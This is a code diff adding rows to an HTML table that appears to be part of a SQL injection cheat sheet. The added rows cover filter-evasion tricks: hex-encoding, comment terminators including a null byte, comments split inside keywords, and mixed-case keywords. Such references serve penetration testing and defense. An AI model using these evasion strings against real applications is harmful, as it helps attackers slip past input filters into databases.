@@ -27,6 +27,10 @@
             <td>SELECT 0x20 + 0x40</td>
         </tr>
         <tr>
+            <td>Unhex/hex</td>
+            <td>unhex(hex(user()))</td>
+        </tr>
+        <tr>
             <td>Bitwise AND</td>
             <td>SELECT 6 &amp; 2</td>
         </tr>
@@ -72,7 +76,11 @@
         </tr>
         <tr>
             <td>Single line comment</td>
-            <td>SELECT 1 -- comments out rest of line<br/>SELECT 1 # comments out rest of line</td>
+            <td>SELECT 1 -- comments out rest of line<br/>SELECT 1 # comments out rest of line<br/>SELECT 1 --+ - Comments out rest of the line<br/>SELECT 1 --+- - Comments out rest of the line<br/>SELECT 1 -- - - Comments out rest of the line<br/>SELECT 1 %00 - Comments out rest of the line</td>
+        </tr>
+        <tr>
+            <td>In-line comment</td>
+            <td>SEL/*_*/ECT * FR/*_*/OM</td>
         </tr>
         <tr>
             <td>No Spaces</td>
@@ -93,6 +101,10 @@
         <tr>
             <td>Invalid Percent Encode</td>
             <td>%SEL%ECT * F%R%OM U%S%ERS</td>
+        </tr>
+        <tr>
+            <td>character obfuscation</td>
+            <td>SeLeCt * FrOm</td>
         </tr>
     </tbody>
 </table>
